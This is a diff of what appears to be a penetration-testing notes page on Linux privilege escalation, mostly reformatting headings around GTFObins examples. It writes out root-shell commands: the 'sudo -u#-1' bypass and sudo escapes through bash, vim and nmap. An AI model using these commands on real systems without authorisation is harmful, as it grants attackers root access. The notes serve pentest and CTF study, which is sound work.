@@ -181,20 +181,21 @@ LinEnum <li>https://github.com/rebootuser/LinEnum</li>
 
 <h1>GTFObins</h1>
 
-
+Heres a lists of a few programs that can be used to privesc, for more check the link below.
 GTFObins <li>https://gtfobins.github.io/</li>
 
-<h1>bash</h1>
+
+<h2>bash</h2>
 
 <b>hacked-account@victim~: </b><code>sudo -u#-1 /bin/bash</code>
 
 <b>hacked-account@victim~: </b><code>sudo bash -p</code>
 
-<b>vim</b>
+<h1>vim</h1>
 
 <b>hacked-account@victim~: </b><code>sudo vim</code> followed by <code>:!bash -p</code> ( -p flag make the progrom persist the root permision)
 
-nmap
+<h2>nmap</h2>
 
 <b>hacked-account@victim~: </b><code>sudo nmap --interactive</code> followed by <code>!sh</code>
 
